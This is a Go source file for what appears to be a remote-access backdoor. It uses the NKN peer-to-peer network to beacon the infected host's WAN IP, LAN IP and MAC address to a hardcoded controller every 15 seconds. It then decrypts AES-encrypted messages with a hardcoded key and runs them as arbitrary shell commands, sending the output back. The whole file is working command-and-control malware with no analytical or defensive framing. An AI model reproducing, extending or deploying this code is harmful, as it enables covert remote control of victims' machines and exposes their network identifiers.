package main

import (
	"../module/cipher"
	"../module/command"
	"../module/ip"
	"crypto/md5"
	"encoding/hex"
	"encoding/json"
	"fmt"
	nkn "github.com/nknorg/nkn-sdk-go"
	"github.com/shirou/gopsutil/cpu"
	"time"
)

func main()  {
	controlid := "monitor.a7ec45e81c1c3e7393eee3aef72b0fb7f96ca2008e36904bfd220de70091fa3a"
	seedstr := InitialSeed()
	Start(seedstr, controlid)
}

func Start(seedstr string,controlid string){
	seedhex, _ := hex.DecodeString(seedstr)
	account, _ := nkn.NewAccount(seedhex)
	goalip := ip.GetWANIP() + "|" + ip.GetLANIP() +  "|" + ip.GetMacAddr()
	Starter, _ := nkn.NewMultiClient(account, seedstr[0:4], 4, false, nknconfig)
	<-Starter.OnConnect.C
	go func() {
		for  {
			_, _ = Starter.Send(nkn.NewStringArray(controlid), goalip, nil)
			time.Sleep(15 *time.Second)
		}
	}()
	for{
		msg := <-Starter.OnMessage.C
		if AesDecode(string(msg.Data)) != "error" {
			msg.Reply(Runcommand(AesDecode(string(msg.Data))))
		}
	}
}

func InitialSeed() string{
	infos, _ := cpu.Info()
	var data []uint8
	for _, info := range infos {
		data, _ = json.MarshalIndent(info, "", " ")
	}
	cpumd5 := md5.Sum(data)
	seed := fmt.Sprintf("%x%x",cpumd5,cpumd5)
	return seed
}

func AesDecode(str string) string {
	plaintext, err := cipher.AesCbcDecrypt([]byte(str), []byte("-=[].!@#$%^&*()_+{}|:<>?"))
	if err != nil {
		return "error"
	} else {
		return string(plaintext)
	}
}

func Runcommand(cmd string) string {
	_, out, _ := command.NewCommand().Exec(cmd)
	return out
}

var nknconfig *nkn.ClientConfig

func init() {
	nknconfig = &nkn.ClientConfig{
		SeedRPCServerAddr:       nil,
		RPCTimeout:              100000,
		RPCConcurrency:          5,
		MsgChanLen:              409600,
		ConnectRetries:          10,
		MsgCacheExpiration:      300000,
		MsgCacheCleanupInterval: 60000,
		WsHandshakeTimeout:      100000,
		WsWriteTimeout:          100000,
		MinReconnectInterval:    100,
		MaxReconnectInterval:    10000,
		MessageConfig:           nil,
		SessionConfig:           nil,
	}
}
